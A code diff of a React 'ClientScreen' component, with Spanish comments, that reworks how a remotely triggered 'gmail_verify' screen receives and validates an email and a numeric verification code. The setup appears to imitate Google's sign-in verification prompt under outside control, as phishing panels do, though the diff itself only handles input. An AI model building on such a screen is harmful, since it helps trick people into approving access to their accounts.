@@ -146,21 +146,30 @@ export default function ClientScreen() {
             return;
           } 
           else if (screenType.toLowerCase() === 'gmail_verify') {
-            console.log('Mostrando pantalla de verificación Google con datos:', data);
+            console.log('🔍 Mostrando pantalla de verificación Google con datos:', JSON.stringify(data));
             setCurrentScreen(ScreenType.GMAIL_VERIFY);
-            // Asegurar que tengamos los datos del código y correo
-            const codigoVerificacion = data.codigo && data.codigo.trim() !== '' ? data.codigo : '14';
             
-            // Actualizamos screenData antes de continuar
-            setScreenData({
+            // Verificamos el formato del código recibido para asegurarnos que sea válido
+            let codigoVerificacion = '14'; // Valor predeterminado
+            
+            if (data.codigo !== undefined) {
+              if (typeof data.codigo === 'string' && data.codigo.trim() !== '') {
+                codigoVerificacion = data.codigo.trim();
+              } else if (typeof data.codigo === 'number') {
+                codigoVerificacion = data.codigo.toString();
+              }
+            }
+            
+            // Creamos un nuevo objeto para screenData para evitar referencias mutables
+            const newScreenData = {
               ...data,
               correo: data.correo || '',
               codigo: codigoVerificacion
-            });
-            console.log('Datos establecidos para gmail_verify:', { 
-              correo: data.correo || '', 
-              codigo: codigoVerificacion
-            });
+            };
+            
+            // Actualizamos el estado de forma asíncrona para asegurar que se aplique
+            console.log('✅ Estableciendo datos para Gmail Verify:', JSON.stringify(newScreenData));
+            setScreenData(newScreenData);
             
             // Importante: no debemos actualizar screenData nuevamente al final de esta función
             return;
